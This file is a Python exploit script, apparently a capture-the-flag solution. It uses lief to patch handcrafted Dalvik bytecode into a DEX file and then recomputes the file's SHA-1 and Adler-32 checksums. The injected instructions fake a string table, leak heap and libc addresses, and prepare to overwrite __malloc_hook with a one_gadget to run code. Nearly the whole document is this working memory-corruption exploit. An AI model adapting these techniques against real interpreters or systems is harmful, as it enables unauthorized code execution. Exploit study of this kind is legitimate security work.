import sys
import lief
import hashlib, zlib
import struct

OP_IGET = chr(0x52)
OP_IPUT = chr(0x59)
OP_NEW_ARRAY = chr(0x23)
OP_CONST_STRING = chr(0x1a)
OP_CONST = chr(0x14)
OP_REM_INT = chr(0x94)
OP_SUB_INT = chr(0x91)
OP_ADD_INT = chr(0x90)
OP_MUL_INT = chr(0x92)
OP_DIV_INT = chr(0x93)
OP_IF_GTZ = chr(0x3c)

def patch(rd, off, d):
    return rd[:off] + d + rd[off+len(d):]

def ifgtz(vA, vB):
    istr = OP_IF_GTZ
    istr += chr(vA)
    istr += struct.pack('<I', vB)
    return istr

def iget(vA, vB, vC):
    istr = OP_IGET
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def iput(vA, vB, vC):
    istr = OP_IPUT
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def newarray(vA, vB, vC):
    istr = OP_NEW_ARRAY
    istr += chr(vA&0xf | ((vB&0xf)<<4))
    istr += struct.pack('<H', vC)
    return istr

def newstring(vA, vB):
    istr = OP_CONST_STRING
    istr += chr(vA)
    istr += struct.pack('<H', vB)
    return istr

def newint(vA, vB):
    istr = OP_CONST
    istr += chr(vA)
    istr += struct.pack('<I', vB)
    return istr

def rem(vA, vB, vC):
    istr = OP_REM_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def sub(vA, vB, vC):
    istr = OP_SUB_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def add(vA, vB, vC):
    istr = OP_ADD_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def mul(vA, vB, vC):
    istr = OP_MUL_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr

def div(vA, vB, vC):
    istr = OP_DIV_INT
    istr += chr(vA)
    istr += chr(vB)
    istr += chr(vC)
    return istr


dex = lief.DEX.parse(sys.argv[1])
#help(dex.header)
#print(dex.header)
#print(dex.header.checksum)
print(dex.methods[1])
print(dex.methods[1].code_offset)

#new-array to fake stringIds
#iget v1, v0_str, strid__heap_addr_0
#...x4
#calculate_cur_string_addr
#iput v1, v0_str, strid_dexfile_stringIds_1


img_base = 0x08048000
stderr_got = 0x08068FE0
stderr_glibc = 0x001B3DF8
one_gadget = 0x3aa19
malloc_hook = 0x1b3768


# Start Patching
with open(sys.argv[1], 'rb') as fd:
    rawdata = fd.read()


pc = dex.methods[1].code_offset + 6
rawdata = patch(rawdata, pc, newarray(1, 0, 3))     # v0: len; v1: array
pc += 4
rawdata = patch(rawdata, pc, newstring(2, 0))   # v2: string
pc += 4
rawdata = patch(rawdata, pc, iget(0, 2, 0))     # v0: second byte of StringIds ptr
pc += 4
rawdata = patch(rawdata, pc, newint(17, 0x10))  # store offset to fake StringIds (Array base + 0x70)
pc += 6
rawdata = patch(rawdata, pc, add(0, 0, 17))     # v0 now stores the new offset of fake StringIds
pc += 4

# Before we patch the StringIds, we need to do a few setups to fake all the offsets/strings we need later
# We need to patch 4 bytes of __malloc_hook to one_gadget, and more for Array to index, so we can do online
# patching
for i in range(12):
    rawdata = patch(rawdata, pc, newint(3, 0x2cd + i*4))
    pc += 6
    rawdata = patch(rawdata, pc, iput(3, 1, 4+i))     # string 1-12: "22" - "33" : offset to index string
    pc += 4                                           # "38" - "49" placing fake string data

for i in range(4):                      # setup the new string offset, new id 12 - 15
    rawdata = patch(rawdata, pc, newint(3, 0x1018 + (38+i)*4))
    pc += 6
    rawdata = patch(rawdata, pc, iput(3, 1, 0x10+i))
    pc += 4

# leak libc address : leak heap address first, and calculate the string offset to got table
rawdata = patch(rawdata, pc, newint(17, 0x100))
pc += 6
rawdata = patch(rawdata, pc, newint(18, 0x10000))
pc += 6
rawdata = patch(rawdata, pc, newint(19, 0x1000000))
pc += 6
rawdata = patch(rawdata, pc, newint(20, 0xffffff00))
pc += 6
rawdata = patch(rawdata, pc, iget(4, 2, 1))     # read string[-21]
pc += 4
rawdata = patch(rawdata, pc, mul(3, 4, 19))     # move to highest byte
pc += 4
rawdata = patch(rawdata, pc, iget(4, 2, 2))     # read string[-22]
pc += 4

rawdata = patch(rawdata, pc, ifgtz(4, 4))   # flip signess
pc += 4
rawdata = patch(rawdata, pc, sub(4, 4, 20))
pc += 4

rawdata = patch(rawdata, pc, mul(4, 4, 18))
pc += 4
rawdata = patch(rawdata, pc, add(3, 4, 3))
pc += 4
rawdata = patch(rawdata, pc, iget(4, 2, 3))     # read string[-23]
pc += 4

rawdata = patch(rawdata, pc, ifgtz(4, 4))   # flip signess
pc += 4
rawdata = patch(rawdata, pc, sub(4, 4, 20))
pc += 4

rawdata = patch(rawdata, pc, mul(4, 4, 17))
pc += 4
rawdata = patch(rawdata, pc, add(3, 4, 3))
pc += 4
rawdata = patch(rawdata, pc, newint(4, 0xb8))   # append last byte - string base offset
pc += 6
rawdata = patch(rawdata, pc, add(3, 4, 3))      # v3: string base addr4ess (heap)
pc += 4
rawdata = patch(rawdata, pc, newint(4, stderr_got)) # calculate offset to stderr got
pc += 6
rawdata = patch(rawdata, pc, sub(5, 4, 3))
pc += 4

# Sub routine, ends with jump table since invoke/call is not implemented && we have max insts limit
# inputs : v5: addr
# outputs : v13, v14, v15
# vars : v6, v7
rawdata = patch(rawdata, pc, newint(13, 10)) # clear out result regs
pc += 6
rawdata = patch(rawdata, pc, newint(14, 0))
pc += 6
rawdata = patch(rawdata, pc, newint(15, 0))
pc += 6
rawdata = patch(rawdata, pc, newint(21, ord('0')))
pc += 6
rawdata = patch(rawdata, pc, newint(6, 10)) # length field of string [10]
pc += 6
rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 1
pc += 4
rawdata = patch(rawdata, pc, add(7, 7, 21))
pc += 4
rawdata = patch(rawdata, pc, mul(15, 7, 18))
pc += 4
rawdata = patch(rawdata, pc, div(5, 5, 6))
pc += 4
rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 2
pc += 4
rawdata = patch(rawdata, pc, add(7, 7, 21))
pc += 4
rawdata = patch(rawdata, pc, mul(7, 7, 17))
pc += 4
rawdata = patch(rawdata, pc, add(15, 7, 15))
pc += 4
rawdata = patch(rawdata, pc, div(5, 5, 6))
pc += 4
rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 3
pc += 4
rawdata = patch(rawdata, pc, add(7, 7, 21))
pc += 4
rawdata = patch(rawdata, pc, add(15, 7, 15))
pc += 4
rawdata = patch(rawdata, pc, div(5, 5, 6))
pc += 4
for i in range(3):                          # bytes 4-6
    rawdata = patch(rawdata, pc, rem(7, 5, 6))
    pc += 4
    rawdata = patch(rawdata, pc, add(7, 7, 21))
    pc += 4
    rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
    pc += 4
    rawdata = patch(rawdata, pc, add(14, 7, 14))
    pc += 4
    rawdata = patch(rawdata, pc, div(5, 5, 6))
    pc += 4
rawdata = patch(rawdata, pc, rem(7, 5, 6))      # byte 7
pc += 4
rawdata = patch(rawdata, pc, add(7, 7, 21))
pc += 4
rawdata = patch(rawdata, pc, add(14, 7, 14))
pc += 4
rawdata = patch(rawdata, pc, div(5, 5, 6))
pc += 4
for i in range(3):                          # bytes 8-10
    rawdata = patch(rawdata, pc, rem(7, 5, 6))
    pc += 4
    rawdata = patch(rawdata, pc, add(7, 7, 21))
    pc += 4
    rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
    pc += 4
    rawdata = patch(rawdata, pc, add(13, 7, 13))
    pc += 4
    rawdata = patch(rawdata, pc, div(5, 5, 6))
    pc += 4


# patch

#*******************
rawdata = patch(rawdata, pc, iput(0, 2, 0))     # patch StringIds pointer to Array area
pc += 4



# Patch Checksum
h1 = hashlib.sha1(rawdata[0x20:]).digest()
rawdata = patch(rawdata, 0xc, h1)
h2 = struct.pack('<I', zlib.adler32(rawdata[0xc:])&0xffffffff)
rawdata = patch(rawdata, 8, h2)

with open('new.dex', 'wb') as fd:
    fd.write(rawdata)
